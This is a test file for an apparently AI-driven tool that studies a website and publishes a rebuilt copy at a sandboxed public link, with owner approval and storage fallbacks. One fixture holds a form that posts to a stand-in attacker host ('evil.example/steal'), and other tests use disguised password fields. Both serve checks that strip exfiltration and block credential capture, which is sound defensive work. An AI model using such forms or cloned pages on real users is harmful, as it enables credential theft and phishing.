// Rebuilding a website: study it, publish an improved version at a public, sandboxed link.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { webcrypto } from 'node:crypto';

const S = await import('./.build/tools/sites.mjs');
const T = await import('./.build/tools/index.mjs');
const brain = await import('./.build/brain.mjs');

const PAGE = `<!doctype html><html lang="en"><head><title>Acme Bakery</title>
<meta name="description" content="Fresh bread in Leeds"><meta name="theme-color" content="#b5651d">
<link rel="stylesheet" href="/css/site.css"><link href="https://fonts.googleapis.com/css2?family=Lora&display=swap" rel="stylesheet">
<script src="https://code.jquery.com/jquery.min.js"></script><script src="https://www.googletagmanager.com/gtag/js?id=G-1"></script></head>
<body><header><nav><a href="/">Home</a><a href="/menu">Menu</a><a href="https://acme.example/contact">Contact</a><button class="navbar-toggler" aria-expanded="false">☰</button></nav></header>
<main><section id="hero" class="hero big"><h1>Bread worth waking up for</h1><p>Sourdough baked every morning since 1998.</p><img src="/img/loaf.jpg" alt="A sourdough loaf"></section>
<section class="carousel"><h2>Our favourites</h2><div class="slick-slide"><img data-src="img/bun.jpg" alt="Cinnamon bun"></div></section>
<section><h2>Visit us</h2><p>12 Market St, Leeds</p><form action="https://acme.example/subscribe"><input type="email" name="e"></form></section></main>
<footer><p>© Acme</p></footer></body></html>`;
const CSS = 'body{font-family:"Lora",serif;color:#3b2a1a;background:#fff8ef}.btn{background:#b5651d;color:#fff8ef}h1{color:#b5651d}';

test('study_site describes the structure, text, images, colours, fonts and scripts of a page', async () => {
  const real = globalThis.fetch;
  globalThis.fetch = async (input) => {
    const url = typeof input === 'string' ? input : input.url;
    if (url === 'https://acme.example/') return new Response(PAGE, { headers: { 'content-type': 'text/html' } });
    if (url === 'https://acme.example/css/site.css') return new Response(CSS, { headers: { 'content-type': 'text/css' } });
    return new Response('', { status: 404 });
  };
  try {
    const out = await T.toolByName.get('study_site').run({ url: 'acme.example/' }, {});
    assert.match(out, /TITLE: Acme Bakery/);
    assert.match(out, /DESCRIPTION: Fresh bread in Leeds/);
    assert.match(out, /PAGE STRUCTURE \(in order\): header > nav > main > section#hero\.hero\.big > section\.carousel > section > footer/);
    assert.match(out, /Menu → https:\/\/acme\.example\/menu/);
    assert.match(out, /h1 Bread worth waking up for/);
    assert.match(out, /https:\/\/acme\.example\/img\/loaf\.jpg — "A sourdough loaf"/);
    assert.match(out, /https:\/\/acme\.example\/img\/bun\.jpg/, 'lazy-loaded images found too');
    assert.match(out, /COLOURS \(most used first\): .*#b5651d.*#3b2a1a/);
    assert.match(out, /FONTS: Lora/);
    assert.match(out, /jquery/);
    assert.match(out, /googletagmanager/);
    assert.match(out, /mobile menu toggle/);
    assert.match(out, /carousel/);
    assert.match(out, /NO mobile viewport tag/);
    assert.match(out, /Sourdough baked every morning/);
    assert.match(out, /call publish_site/);
    assert.match(out, /DATA MODELS IT IMPLIES[\s\S]*subscribers\(email TEXT UNIQUE/);
    assert.match(out, /JS data array shaped like the DATA MODELS/);
    assert.match(out, /100dvh/);
  } finally {
    globalThis.fetch = real;
  }
});

test('a rebuilt page is made safe and phone-ready before it goes live', () => {
  const { html, notes } = S.prepareSite('<!doctype html><html><head><title>A</title></head><body><img src="x.jpg"><form action="https://evil.example/steal" method="post"><input name="e"><button formaction="https://evil.example/2">Go</button></form></body></html>', 'https://acme.example/');
  assert.match(html, /name="viewport"/);
  assert.match(html, /<img loading="lazy" decoding="async" src="https:\/\/acme\.example\/x\.jpg">/, 'relative addresses point at the original site');
  assert.match(html, /noindex/);
  assert.doesNotMatch(html, /evil\.example/, 'form action and formaction removed');
  assert.equal(notes.length, 4);
  assert.throws(() => S.prepareSite('<html><body><input type="password"></body></html>', 'https://bank.example'), /password fields/);
  assert.throws(() => S.prepareSite('<html><body><input type="pass&#119;ord"></body></html>', ''), /password fields/, 'disguised with a character reference');
  assert.throws(() => S.prepareSite('<html><body><input type="pass&#x77;ord"></body></html>', ''), /password fields/);
  assert.throws(() => S.prepareSite("<html><body><script>i.type='password'</script></body></html>", ''), /password fields/, 'made by a script');
  // Only tag attributes are touched, never script code or text.
  const js = S.prepareSite('<html><head></head><body><p>Take action = now</p><script>const action = btn.dataset.action; go(action)</script><form action="/x"><button formaction="/y">Go</button></form></body></html>', '').html;
  assert.match(js, /const action = btn\.dataset\.action; go\(action\)/);
  assert.match(js, /Take action = now/);
  assert.match(js, /<form><button>Go<\/button><\/form>/);
  // Links to other sites leave the frame when tapped; links within the page stay.
  const links = S.prepareSite('<html><head></head><body><a href="https://acme.example/contact">Contact</a><a href="#visit">Visit</a><a target="_blank" href="https://x.example">X</a></body></html>', '').html;
  assert.match(links, /<a target="_top" href="https:\/\/acme\.example\/contact">/);
  assert.match(links, /<a href="#visit">/);
  assert.match(links, /<a target="_blank" href="https:\/\/x\.example">/);
  assert.throws(() => S.prepareSite('<div>just a fragment</div>', ''), /ONE complete HTML document/);
  assert.throws(() => S.prepareSite(`<html><body>${'x'.repeat(400_001)}</body></html>`, ''), /too large/);
});

test('publish_site asks the owner first, showing exactly what goes live where', async () => {
  const tool = T.toolByName.get('publish_site');
  const brain2 = await import('./.build/brain.mjs');
  void brain2;
  const ask = await tool.approval({ name: 'acme', title: 'Acme', source_url: 'https://acme.example/', html: '<!doctype html><html><head><title>Acme</title></head><body>x</body></html>' }, { origin: 'https://g.example' });
  assert.match(ask.reason, /Publish "Acme" \(rebuilt from acme\.example\) as a public page at https:\/\/g\.example\/s\/acme\?/);
  await assert.rejects(tool.approval({ name: 'bank', html: '<html><body><input type=password></body></html>' }, {}), /password fields/);
  // the quality gate: a broken page is never put to the owner for approval
  await assert.rejects(tool.approval({ name: 'broken', html: '<html><body><div><span>x</div></body></html>' }, {}), /not published — fix these first:\n1\. line 1: no <!doctype html>/);
});

test('publish_site refuses a page with errors (the quality gate) and passes warnings on with the link', async () => {
  const db = new Map();
  const storage = { async get(k) { return db.get(k); }, async put(k, v) { db.set(k, structuredClone(v)); }, async delete(k) { return db.delete(k); } };
  const tool = T.toolByName.get('publish_site');
  const tctx = { storage, env: {}, emit: () => undefined, origin: 'https://g.example' };
  const broken = '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>B</title>\n<script src="https://cdn.example/app.js"></script></head>\n<body><section><h2>Hi</h2>\n<script>fetch("https://api.example/x")</script></body></html>';
  await assert.rejects(tool.run({ name: 'broken', html: broken }, tctx), (e) => {
    assert.match(e.message, /^not published — fix these first:\n1\. line 2: <script src="https:\/\/cdn\.example\/app\.js"> won't load/);
    assert.match(e.message, /\n2\. line 4: <\/body> closes <body> from line 3, but <section> \(line 3\) is still open — add <\/section> before it/);
    assert.match(e.message, /\n3\. line 4: fetch\(\) — a published page can't make network requests/);
    return true;
  });
  assert.ok(!db.has('site:broken'), 'nothing went live');
  // warnings don't stop a publish: they ride along in the result, so the model can fix them next
  const warned = '<!doctype html><html><head><meta name="viewport" content="width=device-width"><title>W</title></head><body><img src="https://x.example/a.jpg"><script>console.log(1)</script></body></html>';
  const out = await tool.run({ name: 'warned', html: warned }, tctx);
  assert.match(out, /live now at https:\/\/g\.example\/s\/warned/);
  assert.match(out, /Worth fixing \(check_html warnings\): line 1: <html> has no lang attribute.*\| line 1: <img> without alt.*\| line 1: console\.log left in/);
  assert.ok(db.has('site:warned'));
});

test('publish_site puts the page live at a public link that anyone can open, sandboxed', async () => {
  class MemStorage {
    m = new Map();
    async get(k) { return this.m.has(k) ? structuredClone(this.m.get(k)) : undefined; }
    async put(k, v) { this.m.set(k, structuredClone(v)); }
    async delete(k) { return this.m.delete(k); }
    async list({ prefix = '' } = {}) { return new Map([...this.m].filter(([x]) => x.startsWith(prefix))); }
    async setAlarm() {}
    async getAlarm() { return null; }
  }
  const storage = new MemStorage();
  const events = [];
  const out = await T.toolByName.get('publish_site').run(
    { name: 'Acme Bakery!', title: 'Acme Bakery — rebuilt', source_url: 'https://acme.example/', html: '<!doctype html><html><head><meta name="viewport" content="width=device-width"><title>Acme</title></head><body><h1>Bread</h1></body></html>' },
    { storage, emit: (e) => events.push(e), origin: 'https://ghosty.example.workers.dev' },
  );
  assert.match(out, /live now at https:\/\/ghosty\.example\.workers\.dev\/s\/acme-bakery/);
  assert.deepEqual(events.find((e) => e.t === 'client'), { t: 'client', name: 'show_link', args: { url: 'https://ghosty.example.workers.dev/s/acme-bakery', title: 'Acme Bakery — rebuilt' } });
  assert.ok(events.some((e) => e.t === 'status' && /publishing/.test(e.text)), 'says what it is doing');

  // Served by the Worker to anyone, without signing in.
  const state = { storage, waitUntil() {}, blockConcurrencyWhile: (f) => f() };
  const env = { OWNER_KEY: 'k'.repeat(32), VAULT_KEY: Buffer.from(webcrypto.getRandomValues(new Uint8Array(32))).toString('base64') };
  let agent;
  env.AGENT = { idFromName: () => 'owner', get: () => ({ fetch: (r) => (agent ??= new brain.GhostyAgent(state, env)).fetch(r) }) };
  const go = (path, headers = {}) => brain.default.fetch(new Request(`https://ghosty.example.workers.dev${path}`, { headers }), env, { waitUntil() {} });
  // What a visitor opens: Ghosty's own page, with the bar, framing the rebuilt page.
  const r = await go('/s/acme-bakery', { 'sec-fetch-site': 'cross-site', 'sec-fetch-dest': 'document' });
  assert.equal(r.status, 200);
  const wrap = await r.text();
  assert.match(wrap, /Rebuilt by Ghosty from acme\.example · not the official site/);
  assert.match(wrap, /<iframe src="\/s\/acme-bakery\/page"[^>]*sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox allow-modals allow-top-navigation-by-user-activation"/);
  assert.doesNotMatch(wrap, /allow-forms|allow-same-origin/);
  assert.match(r.headers.get('content-security-policy'), /default-src 'none'.*frame-src 'self'/);
  assert.doesNotMatch(r.headers.get('content-security-policy'), /script-src/, 'the bar page runs no scripts');
  assert.match(r.headers.get('x-robots-tag'), /noindex/);
  // The rebuilt page, in the frame: locked down by the browser.
  const f = await go('/s/acme-bakery/page', { 'sec-fetch-dest': 'iframe' });
  assert.equal(f.status, 200);
  assert.match(await f.text(), /<h1>Bread<\/h1>/);
  const csp = f.headers.get('content-security-policy');
  assert.match(csp, /^sandbox allow-scripts/);
  for (const rule of ["connect-src 'none'", "form-action 'none'", "script-src 'unsafe-inline'", "frame-ancestors 'self'", "base-uri 'none'"]) assert.ok(csp.includes(rule), rule);
  assert.doesNotMatch(csp, /allow-same-origin|allow-forms/, "can't reach Ghosty's storage or keys, can't submit forms");
  // Opened directly, it goes back to the page with the bar.
  const direct = await go('/s/acme-bakery/page', { 'sec-fetch-dest': 'document' });
  assert.equal(direct.status, 302);
  assert.equal(direct.headers.get('location'), '/s/acme-bakery');
  assert.equal((await go('/s/acme-bakery/page')).status, 302, "a browser that doesn't say how it loads the page gets the bar too");
  assert.equal((await brain.default.fetch(new Request('https://ghosty.example.workers.dev/s/nope'), env, { waitUntil() {} })).status, 404);
  // the API itself still needs the owner
  assert.equal((await brain.default.fetch(new Request('https://ghosty.example.workers.dev/api/site/acme-bakery'), env, { waitUntil() {} })).status, 401);
});

test('with KV bound, a page can be published while the database is paused, and is served without the brain', async () => {
  const kv = { m: new Map(), async get(k) { return this.m.has(k) ? JSON.parse(this.m.get(k)) : null; }, async put(k, v) { this.m.set(k, v); }, async delete(k) { this.m.delete(k); } };
  // The database is paused (Cloudflare's daily allowance used up): publishing still works.
  const paused = { async get() { throw new Error('Exceeded allowed rows read in Durable Objects free tier.'); }, async put() { throw new Error('Exceeded allowed rows written in Durable Objects free tier.'); } };
  const events = [];
  const out = await T.toolByName.get('publish_site').run(
    { name: 'paused-bakery', html: '<!doctype html><html><head><meta name="viewport" content="width=device-width"><title>Paused</title></head><body><h1>Still here</h1></body></html>' },
    { env: { SITES: kv }, storage: paused, emit: (e) => events.push(e), origin: 'https://ghosty.example.workers.dev' },
  );
  assert.match(out, /live now at https:\/\/ghosty\.example\.workers\.dev\/s\/paused-bakery/);
  assert.ok(kv.m.has('site:paused-bakery'));
  // Served straight from KV: the brain is never asked.
  const env = { SITES: kv, AGENT: { idFromName: () => 'owner', get: () => ({ fetch: () => { throw new Error('the brain must not be needed'); } }) } };
  const go = (path, headers = {}) => brain.default.fetch(new Request(`https://ghosty.example.workers.dev${path}`, { headers }), env, { waitUntil() {} });
  const r = await go('/s/paused-bakery', { 'sec-fetch-dest': 'document' });
  assert.equal(r.status, 200);
  assert.match(await r.text(), /<iframe src="\/s\/paused-bakery\/page"/);
  const f = await go('/s/paused-bakery/page', { 'sec-fetch-dest': 'iframe' });
  assert.equal(f.status, 200);
  assert.match(await f.text(), /Still here/);
  // A page published before KV existed is still in the brain: the brain is asked for it.
  let asked = 0;
  env.AGENT.get = () => ({ fetch: async () => { asked++; return new Response('from the brain'); } });
  assert.equal(await (await go('/s/older-page')).text(), 'from the brain');
  assert.equal(asked, 1);
});

test('a page republished while the database was paused is the one served after the reset (KV is never behind)', async () => {
  const kv = { m: new Map(), async get(k) { return this.m.has(k) ? JSON.parse(this.m.get(k)) : null; }, async put(k, v) { this.m.set(k, v); }, async delete(k) { this.m.delete(k); } };
  const db = new Map();
  const storage = { down: false, async get(k) { if (this.down) throw new Error('Exceeded allowed rows read in Durable Objects free tier.'); return db.get(k); }, async put(k, v) { if (this.down) throw new Error('Exceeded allowed rows written in Durable Objects free tier.'); db.set(k, structuredClone(v)); } };
  const store = S.siteStore({ SITES: kv }, storage);
  await store.put({ name: 'shop', title: 'v1', html: '<html>one</html>', source: '', at: 1 });
  storage.down = true; // paused: the new version reaches KV only
  await store.put({ name: 'shop', title: 'v2', html: '<html>two</html>', source: '', at: 2 });
  storage.down = false; // midnight: the database is back, still holding v1
  assert.equal((await store.get('shop')).title, 'v2');
  // a page from before KV existed is still found in the database
  db.set('site:old', { name: 'old', title: 'old', html: '<html>old</html>', source: '', at: 0 });
  assert.equal((await store.get('old')).title, 'old');
});

test('the backend a page implies is worked out from its repeated parts and forms', () => {
  const card = (t, p) => `<div class="product-card"><img src="/${t}.jpg"><h3>${t}</h3><span>£${p}</span><button>Add to basket</button></div>`;
  const shop = `<html><body><input type="search">${card('Loaf', '3.50')}${card('Bun', '1.20')}${card('Cake', '12.00')}<section class="reviews">★★★★★ Lovely</section><form><input type="email"><textarea></textarea></form></body></html>`;
  const m = S.dataModels(shop).join('\n');
  assert.match(m, /products\(title TEXT, slug TEXT UNIQUE, price NUMERIC\(10,2\).*images TEXT\[\]/);
  assert.match(m, /carts \+ cart_items/);
  assert.match(m, /reviews\(/);
  assert.match(m, /contact_messages\(/);
  assert.match(m, /GET \/api\/search/);
  const blog = '<html><body><article><time>1 May</time><h2>A</h2></article><article><time>2 May</time><h2>B</h2></article><details>1</details><details>2</details><details>3</details></body></html>';
  const b = S.dataModels(blog).join('\n');
  assert.match(b, /posts\(title TEXT/);
  assert.match(b, /faqs\(/);
  assert.doesNotMatch(b, /products/);
  const saas = '<html><body><h2>Pricing</h2><div>Starter £9 per month</div><div>Pro £29 per month</div><input type="password"></body></html>';
  const p = S.dataModels(saas).join('\n');
  assert.match(p, /plans\(/);
  assert.match(p, /users\(email TEXT UNIQUE, password_hash TEXT\) \+ sessions/);
  assert.deepEqual(S.dataModels('<html><body><h1>Hello</h1></body></html>'), []);
});

test('the site tools are offered when the owner gives a URL or asks for a website', () => {
  const names = (msg) => T.selectTools(msg, new Set(), false).map((t) => t.name);
  assert.ok(names('rebuild https://acme.example and make it better').includes('study_site'));
  assert.ok(names('recreate the website stripe.com for me').includes('publish_site'));
  assert.ok(!names("what's the weather tomorrow").includes('study_site'));
});

test('a site that builds itself with JavaScript is read rendered, so its content is still there', async () => {
  const real = globalThis.fetch;
  const asked = [];
  globalThis.fetch = async (input) => {
    const url = typeof input === 'string' ? input : input.url;
    asked.push(url);
    if (url === 'https://app.example/') return new Response('<!doctype html><html><head><title>App</title><script src="/bundle.js"></script></head><body><div id="root"></div></body></html>', { headers: { 'content-type': 'text/html' } });
    if (url === 'https://r.jina.ai/https://app.example/') return new Response('# Plan your trips\n\nTrack flights and hotels in one place.', { headers: { 'content-type': 'text/plain' } });
    return new Response('', { status: 404 });
  };
  try {
    const out = await T.toolByName.get('study_site').run({ url: 'https://app.example/' }, {});
    assert.match(out, /RENDERED CONTENT/);
    assert.match(out, /Track flights and hotels in one place/);
  } finally {
    globalThis.fetch = real;
  }
});

// ---------------------------------------------------------------------------------------
// Always a live link: absolute addresses, the list of pages, taking one down, pages in parts
// ---------------------------------------------------------------------------------------

test('relative addresses in a rebuilt page are pointed at the original site; anchors, mail links and absolute ones are left alone', () => {
  const html = '<html><body><img src="/img/loaf.jpg"><img src="img/bun.jpg" srcset="img/bun-2x.jpg 2x, /img/bun-3x.jpg 3x"><a href="/menu">Menu</a><a href="#visit">Visit</a><a href="mailto:hi@acme.example">Mail</a><a href="https://other.example/x">Other</a><script src="//cdn.example/lib.js"></script><link rel="stylesheet" href="css/site.css"><a href="javascript:void(0)">js</a></body></html>';
  const out = S.absolutise(html, 'https://acme.example/shop/index.html');
  assert.match(out, /<img src="https:\/\/acme\.example\/img\/loaf\.jpg">/);
  assert.match(out, /<img src="https:\/\/acme\.example\/shop\/img\/bun\.jpg" srcset="https:\/\/acme\.example\/shop\/img\/bun-2x\.jpg 2x, https:\/\/acme\.example\/img\/bun-3x\.jpg 3x">/);
  assert.match(out, /<a href="https:\/\/acme\.example\/menu">Menu<\/a>/);
  assert.match(out, /<a href="#visit">Visit<\/a>/);
  assert.match(out, /<a href="mailto:hi@acme\.example">/);
  assert.match(out, /<a href="https:\/\/other\.example\/x">/);
  assert.match(out, /<script src="https:\/\/cdn\.example\/lib\.js">/);
  assert.match(out, /<link rel="stylesheet" href="https:\/\/acme\.example\/shop\/css\/site\.css">/);
  assert.match(out, /<a href="javascript:void\(0\)">/);
  assert.equal(S.absolutise(html, 'not a url'), html, 'no source: nothing changes');
  const { html: prepared, notes } = S.prepareSite('<!doctype html><html><head><title>x</title></head><body><img src="/a.jpg"></body></html>', 'https://acme.example/');
  assert.match(prepared, /src="https:\/\/acme\.example\/a\.jpg"/);
  assert.ok(notes.includes('relative addresses pointed at the original site'));
});

test('the link is absolute: the host the owner uses, else PUBLIC_ORIGIN from the config, else the path', () => {
  assert.equal(S.siteLink('https://ghosty.example', { PUBLIC_ORIGIN: 'https://pub.example' }, 'My Page'), 'https://ghosty.example/s/my-page');
  assert.equal(S.siteLink('', { PUBLIC_ORIGIN: 'https://pub.example' }, 'my-page'), 'https://pub.example/s/my-page');
  assert.equal(S.siteLink(undefined, undefined, 'my-page'), '/s/my-page');
  assert.deepEqual(S.linksIn('Published "A" — live now at https://g.example/s/a (2 KB). Also https://g.example/s/b-2.'), ['https://g.example/s/a', 'https://g.example/s/b-2']);
});

test('the store keeps a list of published pages, takes pages down, and assembles a page sent in parts', async () => {
  const kv = { m: new Map(), async get(k) { return this.m.has(k) ? JSON.parse(this.m.get(k)) : null; }, async put(k, v) { this.m.set(k, v); }, async delete(k) { this.m.delete(k); } };
  const db = new Map();
  const storage = { async get(k) { return db.get(k); }, async put(k, v) { db.set(k, structuredClone(v)); }, async delete(k) { return db.delete(k); } };
  const store = S.siteStore({ SITES: kv }, storage);
  await store.put({ name: 'one', title: 'One', html: '<html>1</html>', source: 'https://a.example/', at: 1 });
  await store.put({ name: 'two', title: 'Two', html: '<html>22</html>', source: '', at: 2 });
  await store.put({ name: 'one', title: 'One again', html: '<html>111</html>', source: 'https://a.example/', at: 3 });
  let list = await store.list();
  assert.deepEqual(list.map((e) => [e.name, e.title, e.bytes]), [['one', 'One again', 16], ['two', 'Two', 15]], 'newest first, one line per name');
  assert.ok(kv.m.has('site:index') && db.has('site:index'), 'the list lives in both places');
  assert.equal(await store.remove('two'), true);
  assert.equal(await store.get('two'), undefined);
  assert.ok(!kv.m.has('site:two') && !db.has('site:two'));
  assert.deepEqual((await store.list()).map((e) => e.name), ['one']);
  assert.equal(await store.remove('never-was'), false);
  // a page in parts
  await store.addPart('big', '<html><head><title>Big</title></head>');
  await store.addPart('big', '<body>hello</body></html>');
  assert.equal((await store.draft('big')).parts.join(''), '<html><head><title>Big</title></head><body>hello</body></html>');
  await assert.rejects(store.addPart('huge', 'x'.repeat(400_001)), /too large/);
  await store.dropDraft('big');
  assert.equal(await store.draft('big'), undefined);
});

test("a KV hiccup after the database took the page: KV's older copy is cleared so the new page is the one served; if that fails too, publishing fails", async () => {
  const old = { name: 'shop', title: 'OLD', html: '<html>old</html>', source: '', at: 0 };
  const kv = { m: new Map([['site:shop', JSON.stringify(old)]]), async get(k) { return this.m.has(k) ? JSON.parse(this.m.get(k)) : null; }, async put() { throw new Error('KV put failed: daily limit'); }, async delete(k) { this.m.delete(k); } };
  const db = new Map();
  const storage = { async get(k) { return db.get(k); }, async put(k, v) { db.set(k, structuredClone(v)); }, async delete(k) { return db.delete(k); } };
  const store = S.siteStore({ SITES: kv }, storage);
  await store.put({ ...old, title: 'NEW', html: '<html>new</html>', at: 1 });
  assert.equal(db.get('site:shop').title, 'NEW');
  assert.ok(!kv.m.has('site:shop'), "KV's stale copy is gone");
  assert.equal((await store.get('shop')).title, 'NEW', 'served from the database');
  // KV refuses the clean-up as well: its old copy would win every read, so the publish fails honestly
  const stuck = { ...kv, m: new Map([['site:shop', JSON.stringify(old)]]), async delete() { throw new Error('KV delete failed'); } };
  await assert.rejects(S.siteStore({ SITES: stuck }, storage).put({ ...old, title: 'NEWER', at: 2 }), /KV put failed/);
});

test('a page taken down while the database was paused stays down after the reset', async () => {
  const kv = { m: new Map(), async get(k) { return this.m.has(k) ? JSON.parse(this.m.get(k)) : null; }, async put(k, v) { this.m.set(k, v); }, async delete(k) { this.m.delete(k); } };
  const db = new Map();
  const quota = () => { throw new Error('Exceeded allowed rows read in Durable Objects free tier.'); };
  const storage = { down: false, async get(k) { if (this.down) quota(); return db.get(k); }, async put(k, v) { if (this.down) quota(); db.set(k, structuredClone(v)); }, async delete(k) { if (this.down) quota(); return db.delete(k); } };
  const store = S.siteStore({ SITES: kv }, storage);
  await store.put({ name: 'shop', title: 'Shop', html: '<html>shop</html>', source: '', at: 1 });
  storage.down = true; // paused: the database's copy cannot go yet
  assert.equal(await store.remove('shop'), true);
  assert.equal(await store.get('shop'), undefined);
  assert.equal(await S.siteStore({ SITES: kv }).get('shop'), undefined, 'the public route (no database) finds nothing either');
  assert.deepEqual((await store.list()).map((e) => e.name), []);
  assert.ok(db.has('site:shop'), 'still in the paused database');
  storage.down = false; // midnight: the database is back, still holding the page
  assert.equal(await store.get('shop'), undefined, 'not served from the database');
  assert.ok(!db.has('site:shop'), 'the first read after the reset finished the removal');
  assert.ok(!kv.m.has('site:shop'), 'and the marker is gone');
  assert.equal(await store.get('shop'), undefined);
});

test('a KV hiccup after the database took the page does not fail the publish (the page is live from the database)', async () => {
  const kv = { async get() { return null; }, async put() { throw new Error('KV put failed: daily limit'); }, async delete() {} };
  const db = new Map();
  const storage = { async get(k) { return db.get(k); }, async put(k, v) { db.set(k, structuredClone(v)); }, async delete(k) { return db.delete(k); } };
  const store = S.siteStore({ SITES: kv }, storage);
  await store.put({ name: 'ok', title: 'OK', html: '<html>ok</html>', source: '', at: 1 });
  assert.ok(db.has('site:ok'));
  // but with the database paused too, nothing kept it: that is a failure
  const paused = { async get() { throw new Error('Exceeded allowed rows read in Durable Objects free tier.'); }, async put() { throw new Error('Exceeded allowed rows written in Durable Objects free tier.'); } };
  await assert.rejects(S.siteStore({ SITES: kv }, paused).put({ name: 'lost', title: 'Lost', html: '<html>x</html>', source: '', at: 1 }), /KV put failed/);
});

test('publishing through the agent: the reply always carries the link, the history keeps a link card, pages are listed and taken down', async () => {
  class MemStorage {
    m = new Map();
    async get(k) { return this.m.has(k) ? structuredClone(this.m.get(k)) : undefined; }
    async put(k, v) { this.m.set(k, structuredClone(v)); }
    async delete(k) { return Array.isArray(k) ? k.filter((x) => this.m.delete(x)).length : this.m.delete(k); }
    async list({ prefix = '' } = {}) { return new Map([...this.m].filter(([x]) => x.startsWith(prefix))); }
    async setAlarm() {}
    async getAlarm() { return null; }
  }
  const storage = new MemStorage();
  const pending = [];
  const env = { MOCK_LLM: '1', VAULT_KEY: Buffer.alloc(32, 3).toString('base64'), PUBLIC_ORIGIN: 'https://pub.example' };
  const agent = new brain.GhostyAgent({ storage, waitUntil: (p) => pending.push(p), blockConcurrencyWhile: (f) => f() }, env);
  const call = async (path, init = {}) => {
    const r = await agent.fetch(new Request(`https://ghosty.test/api${path}`, { ...init, headers: { 'x-ghosty-key': 'owner-key-for-tests-0123456789', ...(init.headers ?? {}) } }));
    const text = await r.text();
    await Promise.allSettled(pending.splice(0));
    return { status: r.status, text, json: () => JSON.parse(text), events: () => text.trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)) };
  };
  // the model forgets to repeat the link ("quietly"): the agent adds it
  let ev = (await call('/chat', { method: 'POST', body: JSON.stringify({ message: 'publish site acme-bakery quietly' }) })).events();
  const approval = ev.find((e) => e.t === 'approval');
  assert.ok(approval, 'asks before publishing');
  assert.match(approval.reason, /^Publish "Acme Bakery — rebuilt" \(rebuilt from acme\.example\) as a public page at https:\/\/ghosty\.test\/s\/acme-bakery\?/);
  ev = (await call('/approve', { method: 'POST', body: JSON.stringify({ id: approval.id, allow: true }) })).events();
  const text = ev.find((e) => e.t === 'text')?.text ?? '';
  assert.match(text, /^Done\.\n\nLive link: https:\/\/ghosty\.test\/s\/acme-bakery$/);
  assert.ok(ev.some((e) => e.t === 'client' && e.name === 'show_link' && e.args.url === 'https://ghosty.test/s/acme-bakery'));
  const history = (await call('/history')).json();
  const last = history.turns.at(-1);
  assert.deepEqual(last.link, { url: 'https://ghosty.test/s/acme-bakery', title: 'Acme Bakery — rebuilt' }, 'the history keeps the card');
  // the list, through the route the Workshop uses and through the tool
  const sites = (await call('/sites')).json();
  assert.equal(sites.origin, 'https://ghosty.test');
  assert.deepEqual(sites.sites.map((s) => [s.name, s.title]), [['acme-bakery', 'Acme Bakery — rebuilt']]);
  ev = (await call('/chat', { method: 'POST', body: JSON.stringify({ message: 'list sites' }) })).events();
  assert.match(ev.find((e) => e.t === 'text')?.text ?? '', /https:\/\/ghosty\.test\/s\/acme-bakery — "Acme Bakery — rebuilt" \(from acme\.example\)/);
  // publishing again under the same name says it replaces the page
  ev = (await call('/chat', { method: 'POST', body: JSON.stringify({ message: 'publish site acme-bakery' }) })).events();
  assert.match(ev.find((e) => e.t === 'approval').reason, /^Update "Acme Bakery — rebuilt".*this replaces the page already there\)$/);
  // a page in parts
  for (const n of [1, 2, 3]) (await call('/chat', { method: 'POST', body: JSON.stringify({ message: `draft site in-parts part ${n}` }) })).events();
  ev = (await call('/chat', { method: 'POST', body: JSON.stringify({ message: 'publish draft in-parts' }) })).events();
  const ap2 = ev.find((e) => e.t === 'approval');
  assert.match(ap2.reason, /^Publish "In parts" as a public page at https:\/\/ghosty\.test\/s\/in-parts\?/);
  ev = (await call('/approve', { method: 'POST', body: JSON.stringify({ id: ap2.id, allow: true }) })).events();
  assert.match(ev.find((e) => e.t === 'text')?.text ?? '', /live now at https:\/\/ghosty\.test\/s\/in-parts/);
  assert.match(storage.m.get('site:in-parts').html, /<h1>Part two<\/h1><p>Part three<\/p>/);
  assert.equal(storage.m.has('site:draft:in-parts'), false, 'the draft is dropped once published');
  // taking a page down: asks first, then the link is gone
  ev = (await call('/chat', { method: 'POST', body: JSON.stringify({ message: 'unpublish site in-parts' }) })).events();
  const ap3 = ev.find((e) => e.t === 'approval');
  assert.match(ap3.reason, /^Take down "In parts" at https:\/\/ghosty\.test\/s\/in-parts\?/);
  ev = (await call('/approve', { method: 'POST', body: JSON.stringify({ id: ap3.id, allow: true }) })).events();
  assert.match(ev.find((e) => e.t === 'text')?.text ?? '', /Taken down/);
  assert.equal(storage.m.has('site:in-parts'), false);
  assert.deepEqual((await call('/sites')).json().sites.map((s) => s.name), ['acme-bakery']);
  assert.equal((await call('/sites/acme-bakery', { method: 'DELETE' })).json().removed, true, 'the Workshop button');
  assert.deepEqual((await call('/sites')).json().sites, []);
});

// The website kit and the website project (sitekit, sitebuild.ts).
await import('./sitekit.test.mjs');
